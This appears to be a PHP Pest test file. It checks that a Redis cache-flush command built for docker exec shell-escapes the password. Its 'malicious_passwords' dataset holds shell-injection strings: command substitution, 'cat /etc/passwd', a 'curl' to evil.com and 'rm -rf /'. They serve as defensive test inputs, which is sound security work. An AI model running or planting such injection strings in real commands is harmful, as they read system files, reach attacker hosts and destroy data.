<?php

use App\Actions\Database\FlushCacheDatabase;

dataset('malicious_passwords', [
    'semicolon separator' => ['pass; id > /tmp/pwned; echo'],
    'command substitution $()' => ['pass$(id > /tmp/pwned)'],
    'backtick substitution' => ['pass`id > /tmp/pwned`'],
    'pipe operator' => ['pass | cat /etc/passwd'],
    'background operator' => ['pass & curl http://evil.com'],
    'single quote breakout' => ["pass' ; rm -rf / ; '"],
]);

test('flush command runs FLUSHALL ASYNC via docker exec against the container uuid', function () {
    $command = (new FlushCacheDatabase)->buildFlushCommand('abc123uuid', 'secret');

    expect($command)->toStartWith('docker exec abc123uuid redis-cli')
        ->and($command)->toEndWith('FLUSHALL ASYNC')
        ->and($command)->toContain("-a 'secret'");
});

test('flush command omits the -a flag when no password is set', function () {
    $command = (new FlushCacheDatabase)->buildFlushCommand('abc123uuid', null);

    expect($command)->toBe('docker exec abc123uuid redis-cli FLUSHALL ASYNC')
        ->and($command)->not->toContain('-a');
});

test('flush command shell-escapes the password so it cannot inject shell commands', function (string $malicious) {
    $command = (new FlushCacheDatabase)->buildFlushCommand('abc123uuid', $malicious);

    // The password must appear only inside a single-quoted, escaped argument.
    expect($command)->toContain(escapeshellarg($malicious))
        ->and($command)->toEndWith('FLUSHALL ASYNC');

    // Strip the escaped password out; nothing dangerous may remain in the raw command.
    $withoutPassword = str_replace(escapeshellarg($malicious), '', $command);
    expect($withoutPassword)->toBe('docker exec abc123uuid redis-cli -a  FLUSHALL ASYNC');
})->with('malicious_passwords');
